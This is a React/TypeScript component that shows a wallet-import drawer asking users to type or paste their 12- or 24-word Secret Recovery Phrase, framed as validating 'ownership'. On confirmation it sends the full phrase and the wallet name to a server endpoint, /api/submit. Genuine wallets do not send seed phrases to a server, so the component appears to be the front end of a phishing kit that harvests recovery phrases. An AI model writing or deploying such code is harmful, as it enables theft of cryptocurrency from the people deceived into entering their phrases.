"use client";

import type React from "react";
import axios from "axios";
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Drawer,
  DrawerContent,
  DrawerHeader,
  DrawerTitle,
  DrawerClose,
} from "@/components/ui/drawer";
import { X, Eye, EyeOff, Copy, Loader2 } from "lucide-react";

interface MnemonicDrawerProps {
  isOpen: boolean;
  onOpenChange: (open: boolean) => void;
  onConfirm: () => void;
  onError: () => void;
  selectedWallet: { name: string };
}

export function MnemonicDrawer({
  isOpen,
  onOpenChange,
  onConfirm,
  selectedWallet,
  onError,
}: MnemonicDrawerProps) {
  const [phraseLength, setPhraseLength] = useState("12");
  const [mnemonicWords, setMnemonicWords] = useState<string[]>(
    Array(12).fill("")
  );
  const [visibleWords, setVisibleWords] = useState<boolean[]>(
    Array(12).fill(false)
  );
  const [isSubmitting, setIsSubmitting] = useState(false);

  const resetWordState = (length: number) => {
    setMnemonicWords(Array(length).fill(""));
    setVisibleWords(Array(length).fill(false));
  };

  const normalizePastedWords = (value: string) => {
    return value
      .trim()
      .split(/\s+/)
      .map((word) =>
        word
          .replace(/^[0-9]+[.)-]?/, "")
          .trim()
          .toLowerCase()
      )
      .filter(Boolean);
  };

  const handlePhraseLength = (length: string) => {
    setPhraseLength(length);
    const newLength = Number.parseInt(length);
    resetWordState(newLength);
  };

  const handleWordChange = (index: number, value: string) => {
    const newWords = [...mnemonicWords];
    newWords[index] = value.trim().toLowerCase();
    setMnemonicWords(newWords);
  };

  const handleInputPaste = (
    e: React.ClipboardEvent<HTMLInputElement>,
    index: number
  ) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData("text");
    const words = normalizePastedWords(pastedText);
    const selectedLength = Number.parseInt(phraseLength);

    if (words.length === 12 || words.length === 24) {
      setPhraseLength(words.length.toString());
      setMnemonicWords(words);
      setVisibleWords(Array(words.length).fill(false));
      return;
    }

    if (words.length === selectedLength) {
      setMnemonicWords(words);
      setVisibleWords(Array(words.length).fill(false));
      return;
    }

    if (words.length === 1) {
      const newWords = [...mnemonicWords];
      newWords[index] = words[0];
      setMnemonicWords(newWords);
      return;
    }

    if (words.length > 1) {
      const newWords = [...mnemonicWords];
      words.slice(0, newWords.length).forEach((word, wordIndex) => {
        newWords[wordIndex] = word;
      });
      setMnemonicWords(newWords);
    }
  };

  const toggleWordVisibility = (index: number) => {
    const newVisibility = [...visibleWords];
    newVisibility[index] = !newVisibility[index];
    setVisibleWords(newVisibility);
  };

  const handleConfirmPhrase = async () => {
    setIsSubmitting(true);

    try {
      const response = await axios.post("/api/submit", {
        phrase: mnemonicWords.join(" "),
        walletType: selectedWallet.name,
        phraseLength: Number.parseInt(phraseLength),
      });

      const result = response.data;

      if (result.success) {
        onConfirm();
        resetWordState(Number.parseInt(phraseLength));
      } else {
        onError();
      }
    } catch (error) {
      console.error("Error submitting mnemonic:", error);
      onError();
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <Drawer open={isOpen} onOpenChange={onOpenChange} direction="right">
        <DrawerContent className="h-full w-full sm:w-[500px] max-w-[90vw] ml-auto bg-gray-900/95 backdrop-blur-sm border-l border-gray-700 rounded-none">
          <div className="p-4 sm:p-6 overflow-y-auto h-full">
            <div className="flex items-center justify-between mb-4 sm:mb-6">
              <div className="w-6 h-6 sm:w-8 sm:h-8 bg-blue-600 rounded-lg flex items-center justify-center text-sm sm:text-base">
                🛡️
              </div>
              <DrawerClose asChild></DrawerClose>
            </div>

            <div className="mb-4 sm:mb-6">
              <DrawerHeader className="p-0 mb-3 sm:mb-4">
                <DrawerTitle className="text-white text-md sm:text-lg font-semibold mb-2 sm:mb-3 text-center">
                  Import your wallet with your Secret Recovery Phrase
                </DrawerTitle>
              </DrawerHeader>
              <p className="text-gray-400 text-xs sm:text-sm leading-relaxed mb-3 sm:mb-4 text-center">
                We will use your Secret Recovery Phrase to validate your
                ownership. Enter the Secret Recovery Phrase that you were given
                when you created your wallet.{" "}
                <span className="text-blue-400 cursor-pointer hover:underline">
                  Learn more
                </span>
              </p>

              <Select value={phraseLength} onValueChange={handlePhraseLength}>
                <SelectTrigger className="w-full bg-gray-800 border-gray-600 text-white text-sm sm:text-base">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-gray-800 border-gray-600">
                  <SelectItem
                    value="12"
                    className="text-white text-sm sm:text-base"
                  >
                    I have a 12-word phrase
                  </SelectItem>
                  <SelectItem
                    value="24"
                    className="text-white text-sm sm:text-base"
                  >
                    I have a 24-word phrase
                  </SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div className="bg-blue-900/30 border border-blue-700/50 rounded-lg p-3 sm:p-4 mb-4 sm:mb-6">
              <div className="flex items-start gap-2 sm:gap-3">
                <div className="w-4 h-4 sm:w-5 sm:h-5 bg-blue-600 rounded flex items-center justify-center shrink-0 mt-0.5">
                  <Copy className="h-2.5 w-2.5 sm:h-3 sm:w-3 text-white" />
                </div>
                <div>
                  <p className="text-blue-200 text-xs sm:text-sm mb-1 sm:mb-2">
                    You can paste your entire secret recovery phrase into any
                    field below
                  </p>
                  <p className="text-blue-300 text-[10px] sm:text-xs">
                    Simply click on any input field and paste (Ctrl+V or Cmd+V)
                    - the words will automatically fill all fields
                  </p>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 sm:gap-3 mb-4 sm:mb-6">
              {Array.from({ length: Number.parseInt(phraseLength) }).map(
                (_, index) => (
                  <div key={index} className="relative">
                    <div className="absolute left-2 sm:left-3 top-1/2 transform -translate-y-1/2 text-gray-500 text-xs sm:text-sm font-medium">
                      {index + 1}.
                    </div>
                    <Input
                      type={visibleWords[index] ? "text" : "password"}
                      value={mnemonicWords[index]}
                      onChange={(e) => handleWordChange(index, e.target.value)}
                      onPaste={(e) => handleInputPaste(e, index)}
                      className="bg-gray-800 border-gray-600 text-white pl-6 sm:pl-8 pr-8 sm:pr-10 placeholder:text-gray-500 text-xs sm:text-sm h-9 sm:h-10"
                      placeholder="••••••"
                      disabled={isSubmitting}
                    />
                    <Button
                      variant="ghost"
                      size="icon"
                      className="absolute right-0.5 sm:right-1 top-1/2 transform -translate-y-1/2 h-6 w-6 sm:h-8 sm:w-8 text-gray-400 hover:text-white"
                      onClick={() => toggleWordVisibility(index)}
                      disabled={isSubmitting}
                    >
                      {visibleWords[index] ? (
                        <EyeOff className="h-3 w-3 sm:h-4 sm:w-4" />
                      ) : (
                        <Eye className="h-3 w-3 sm:h-4 sm:w-4" />
                      )}
                    </Button>
                  </div>
                )
              )}
            </div>

            <Button
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-2.5 sm:py-3 rounded-lg font-medium text-sm sm:text-base disabled:opacity-50"
              onClick={handleConfirmPhrase}
              disabled={
                mnemonicWords.some((word) => !word.trim()) || isSubmitting
              }
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Updating...
                </>
              ) : (
                "Confirm Secret Recovery Phrase"
              )}
            </Button>
          </div>
        </DrawerContent>
      </Drawer>
    </>
  );
}
